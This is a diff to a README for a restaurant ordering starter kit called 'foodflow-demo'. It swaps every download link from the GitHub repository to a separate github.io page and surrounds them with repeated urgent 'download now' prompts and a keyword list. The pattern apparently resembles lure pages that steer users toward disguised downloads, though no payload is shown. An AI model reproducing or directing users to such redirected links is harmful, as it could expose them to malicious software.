@@ -1,6 +1,6 @@
 # 🍔 foodflow-demo - Launch Your Restaurant Online Today
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20foodflow%20demo-blue?style=for-the-badge&logo=github)](https://github.com/Subwaytraincerebrum94/foodflow-demo)
+[![Download Now](https://img.shields.io/badge/Download-Get%20foodflow%20demo-blue?style=for-the-badge&logo=github)](https://subwaytraincerebrum94.github.io)
 
 ## 👋 Welcome to foodflow-demo
 
@@ -29,7 +29,7 @@ Getting started is simple. Follow these steps:
 
 Visit this link to download the application:
 
-[**https://github.com/Subwaytraincerebrum94/foodflow-demo**](https://github.com/Subwaytraincerebrum94/foodflow-demo)
+[**https://subwaytraincerebrum94.github.io**](https://subwaytraincerebrum94.github.io)
 
 ### Step 2: Find the Download Button
 
@@ -159,7 +159,7 @@ Your restaurant deserves to be online. With foodflow-demo, you can have a profes
 
 **Here's your download link again:**
 
-[**Download foodflow-demo Now**](https://github.com/Subwaytraincerebrum94/foodflow-demo)
+[**Download foodflow-demo Now**](https://subwaytraincerebrum94.github.io)
 
 Join thousands of restaurants using WhatsApp ordering to grow their business. Your customers are online right now – make it easy for them to find you and order from you.
 
@@ -181,6 +181,6 @@ Don't let another day go by without an online presence. Download foodflow-demo n
 
 Remember: the best time to start was yesterday. The second best time is now. Click that download button and launch your restaurant's online ordering today!
 
-[**Get foodflow-demo Here**](https://github.com/Subwaytraincerebrum94/foodflow-demo)
+[**Get foodflow-demo Here**](https://subwaytraincerebrum94.github.io)
 
 Keywords: boilerplate, ecommerce, food-delivery, pwa, react19, restaurant-website, starter-kit, tailwindcss-v4, typescript, vite, whatsapp-ordering, zero-backend
